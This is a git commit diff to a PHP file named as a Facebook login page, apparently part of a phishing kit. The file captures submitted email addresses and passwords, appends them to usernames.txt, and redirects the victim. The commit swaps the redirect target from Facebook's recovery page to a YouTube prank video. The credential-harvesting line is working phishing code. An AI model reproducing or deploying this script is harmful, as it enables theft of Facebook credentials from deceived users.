d6f75ebcc0045fe6ff5576e19f798e71d19ef777
Lê Thành <70613309+LeThanhGodz@users.noreply.github.com>
2021-10-08 11:29:29 +0700

    Update login.php

--- .sites/facebook/login.php
+++ .sites/facebook/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/recover/initiate/');
+header('Location: https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley');
 exit();
 ?>
